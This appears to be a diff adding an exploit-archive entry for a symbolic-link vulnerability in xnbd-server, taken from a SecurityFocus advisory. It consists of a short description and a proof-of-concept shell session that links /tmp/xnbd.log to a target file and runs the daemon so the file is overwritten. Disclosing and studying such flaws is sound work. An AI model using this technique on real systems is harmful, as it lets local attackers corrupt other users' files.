@@ -1,0 +1,21 @@
+source: http://www.securityfocus.com/bid/57784/info
+
+xNBD is prone to a vulnerability because it handles temporary files in an insecure manner. 
+
+Local attackers may leverage this issue to perform symbolic-link attacks in the context of the affected application. Other attacks may also be possible.
+
+$ ln -s "${HOME}"/ATTACK_TARGET /tmp/xnbd.log
+
+  $ touch DISK
+  $ truncate --size=$((100*1024**2)) DISK
+
+  $ /usr/sbin/xnbd-server --daemonize --target DISK
+  xnbd-server(12462) msg: daemonize enabled
+  xnbd-server(12462) msg: cmd target mode
+  xnbd-server(12462) msg: disk DISK size 104857600 B (100 MB)
+  xnbd-server(12462) msg: xnbd master initialization done
+  xnbd-server(12462) msg: logfile /tmp/xnbd.log
+
+  $ ls -l ~/ATTACK_TARGET
+  -rw------- 1 user123 user123 653 Feb  1 16:41 \
+    /home/user123/ATTACK_TARGET
